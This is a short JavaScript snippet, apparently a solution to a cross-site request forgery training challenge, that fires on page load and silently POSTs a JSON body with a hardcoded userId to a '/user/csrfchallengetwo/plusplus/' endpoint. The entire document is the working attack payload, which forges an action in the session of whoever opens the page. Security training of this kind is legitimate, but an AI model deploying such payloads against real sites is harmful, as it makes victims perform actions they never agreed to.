window.onload = function(){

var xhr = new XMLHttpRequest();
xhr.open("POST", "/user/csrfchallengetwo/plusplus/", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    userId: bc0b85a52bc83d2672aecf82fb695665fca2f921
}));
};

